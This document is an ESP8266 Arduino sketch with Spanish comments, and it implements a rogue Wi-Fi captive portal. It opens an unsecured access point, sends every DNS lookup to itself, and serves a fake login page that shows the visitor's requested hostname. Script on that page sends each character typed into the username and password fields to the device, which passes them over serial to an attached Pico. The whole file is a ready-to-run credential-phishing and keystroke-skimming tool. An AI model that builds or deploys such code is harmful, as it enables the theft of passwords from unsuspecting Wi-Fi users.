#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266WiFi.h>

const char *ssid = "UNGS 100% Real No Fake";
const char *password = ""; // sin contraseña

// HTML (incluye el JS que ya tenés)
const char htmlPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head><title>Inicio de sesión</title></head>
<body>
<h2>Acceso a <span id="fake-domain">sitio</span></h2>
<form>
Usuario: <input type="text" id="user"><br>
Contraseña: <input type="password" id="pass"><br>
<input type="submit" value="Entrar">
</form>
<script>
document.getElementById('fake-domain').innerText = window.location.hostname;
function sendChar(c) {
  fetch(`/send?char=${encodeURIComponent(c)}`).catch(() => {});
}
function attachListener(id) {
  const el = document.getElementById(id);
  el.addEventListener('input', e => {
    const val = e.target.value;
    const char = val[val.length - 1];
    if (char) sendChar(char);
  });
}
attachListener('user');
attachListener('pass');
</script>
</body>
</html>
)rawliteral";

ESP8266WebServer server(80);

void handleRoot() {
  server.send_P(200, "text/html", htmlPage);
}

void handleChar() {
  if (server.hasArg("char")) {
    String c = server.arg("char");
    Serial.print(c); // ENVÍA por UART al Pico
    server.send(200, "text/plain", "ok");
  } else {
    server.send(400, "text/plain", "missing char");
  }
}

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1); // IP del ESP como AP
DNSServer dnsServer;
void setup() {
  Serial.begin(9600);

  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, password);

  dnsServer.start(DNS_PORT, "*", apIP); // Redirige TODAS las consultas a 192.168.4.1

  server.on("/", handleRoot);
  server.on("/send", handleChar);

  server.onNotFound([]() {
    server.sendHeader("Location", "http://192.168.4.1", true);
    server.send(302, "text/plain", "");
  });

  server.begin();
}
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
